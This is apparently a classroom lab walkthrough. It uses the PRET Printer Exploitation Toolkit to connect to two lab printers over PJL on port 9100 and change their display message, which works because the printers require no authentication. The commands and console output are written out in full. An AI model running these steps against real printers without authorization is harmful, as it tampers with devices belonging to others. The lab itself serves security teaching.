## Printer Hacking

### Requirement

In this exercise, we will change the display message on a printer. The only reason this attack works is because there is a lack of authentication in most printers.

### Background

Why printer hacking: read this article first:
https://www.theverge.com/2018/11/30/18119576/pewdiepie-printer-hack-t-series-youtube

### Setup

One VM only.

### Steps

Pret stands for PRinter Exploitation Toolkit.

1. get the source code from github:

```console
git clone https://github.com/RUB-NDS/PRET
```

2. go inside the PRET directory:

```console
cd PRET
```

3. install necessary modules:

```console
sudo pip install colorama pysnmp
```

4. select a targeted printer (IP: either 10.29.2.31, or 10.29.2.45), test if the printer has port 9100 open: 

```console
telnet printerIP 9100 (You will see "Connection refused" if not open)
```

5. now that you are in the PRET directory, run the script to establish a connection between you and the printer:

```console
[05/18/22]seed@VM:~/PRET$ ./pret.py 10.29.2.31 pjl
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              
                                                                   
     (ASCII art by                                                 
     Jan Foerster)                                                 
                                                                   
Connection to 10.29.2.31 established
Device:   HP LaserJet M606

Welcome to the pret shell. Type help or ? to list commands.
10.29.2.31:/> 
```

or the other printer:

```console
[05/18/22]seed@VM:~/PRET$ ./pret.py 10.29.2.45 pjl
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              
                                                                   
     (ASCII art by                                                 
     Jan Foerster)                                                 
                                                                   
Connection to 10.29.2.45 established
Device:   Receiving data failed (watchdog timeout)
                        
Welcome to the pret shell. Type help or ? to list commands.
10.29.2.45:/> 
```

6. change the display message: 

```console
10.29.2.31:/> display Game Over
Setting printer's display message to "Game Over"
```

```console
10.29.2.45:/> display Game Over
Setting printer's display message to "Game Over"
```

This will change the printer display message to "Game Over...".

7. you can then type quit to exit:

```console
10.29.2.31:/> quit
```

or

```console
10.29.2.45:/> quit
```
